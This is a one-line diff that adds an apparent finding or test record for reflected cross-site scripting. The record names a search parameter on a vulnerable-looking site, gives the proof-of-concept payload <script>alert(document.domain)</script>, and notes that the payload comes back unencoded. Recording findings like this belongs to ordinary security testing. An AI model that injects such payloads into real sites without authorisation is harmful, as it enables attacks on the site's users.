@@ -1,0 +1,1 @@
+xss search <script>alert(document.domain)</script> https://vuln-site.com/?search=test Payload reflected unencoded in response body
